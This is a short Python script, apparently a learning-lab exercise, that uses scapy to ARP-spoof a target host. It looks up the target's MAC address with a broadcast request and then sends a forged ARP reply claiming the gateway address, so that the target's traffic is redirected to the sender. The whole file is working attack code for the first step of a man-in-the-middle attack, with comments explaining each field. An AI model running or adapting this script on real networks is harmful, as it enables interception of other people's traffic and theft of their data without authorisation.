#!/usr/bin/env python

import scapy.all as scapy
import argparse

def main():
    tar_IP = "10.0.2.7"
    spoofIP = "10.0.2.1"

    packet = create_packet(tar_IP, spoofIP)

    scapy.send(packet)


def create_packet(tar_IP, spoofIP):
    #gets mac for provided IP first:
    mac = get_mac(tar_IP)

    #Creates a packet to spoof a target that we are the gateway IP
    #pdst=destination IP (of our target)
    #hwdst=destination MAC (of out target)
    #prsc=projected source (what we're telling this target our fake IP is)
        #reassociates MAC address in target's table for this IP to our MAC
    packet = scapy.ARP(op=2, pdst=tar_IP, hwdst=mac, psrc=spoofIP)

    return packet


def get_mac(ip):
    #creates an arp request packet at target ip
    arp_request = scapy.ARP(pdst=ip)
    #creates a broadcast packet to the generic broadcast mac addr
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    #combines the arp and broadcast packets for later use
    arp_request_broadcast = broadcast/arp_request
    #sends arp packet via srp and stores answered and unanswered packet responses
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc


if __name__ == '__main__':
    main()